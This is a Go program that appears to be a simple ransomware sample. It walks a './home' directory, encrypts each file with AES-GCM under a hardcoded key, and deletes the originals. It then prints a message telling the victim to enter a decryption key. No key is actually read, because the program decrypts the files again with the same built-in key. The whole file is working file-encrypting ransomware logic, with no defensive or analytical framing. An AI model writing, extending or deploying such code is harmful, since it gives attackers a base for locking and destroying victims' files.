package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// Function to encrypt a file
func encryptFile(path string, gcm cipher.AEAD) {
	original, err := os.ReadFile(path)
	if err != nil {
		fmt.Println("Error while reading file:", err)
		return
	}

	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	encrypted := gcm.Seal(nonce, nonce, original, nil)

	err = os.WriteFile(path+".enc", encrypted, 0666)
	if err != nil {
		fmt.Println("Error while writing encrypted file:", err)
	} else {
		os.Remove(path)
	}
}

// Function to decrypt a file
func decryptFile(path string, gcm cipher.AEAD) {
	encrypted, err := os.ReadFile(path)
	if err != nil {
		fmt.Println("Error while reading encrypted file:", err)
		return
	}

	nonce := encrypted[:gcm.NonceSize()]
	encrypted = encrypted[gcm.NonceSize():]
	original, err := gcm.Open(nil, nonce, encrypted, nil)
	if err != nil {
		fmt.Println("Error while decrypting file:", err)
		return
	}

	err = os.WriteFile(path[:len(path)-4], original, 0666)
	if err != nil {
		fmt.Println("Error while writing decrypted file:", err)
	} else {
		os.Remove(path)
	}
}

// Function to process files (encrypt or decrypt)
func processFiles(action string, gcm cipher.AEAD) {
	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Error while walking file path:", err)
			return nil
		}

		if !info.IsDir() {
			if strings.HasSuffix(path, ".enc") && action == "decrypt" {
				fmt.Println("Decrypting " + path + "...")
				decryptFile(path, gcm)
			} else if !strings.HasSuffix(path, ".enc") && action == "encrypt" {
				fmt.Println("Encrypting " + path + "...")
				encryptFile(path, gcm)
			}
		}
		return nil
	})
}

// Function to get the AES key (hardcoded)
func getKey() (cipher.AEAD, error) {
	// Hardcoded key (change this to your desired key)
	key := []byte("thisisthesecretkeythatwillbeused")

	// Use the hardcoded key for AES encryption
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	return gcm, nil
}

func main() {
	// Automatically encrypt the files when the program starts
	gcm, err := getKey()
	if err != nil {
		fmt.Println("Error setting up AES:", err)
		return
	}

	// Encrypt all files
	fmt.Println("Encrypting files...")
	processFiles("encrypt", gcm)

	// Ask for the decryption key after encryption
	fmt.Println("\nFiles encrypted. Please enter the decryption key to unlock your files.")

	// Decrypt files after key is provided
	gcm, err = getKey()
	if err != nil {
		fmt.Println("Error setting up AES for decryption:", err)
		return
	}

	fmt.Println("Decrypting files...")
	processFiles("decrypt", gcm)
}
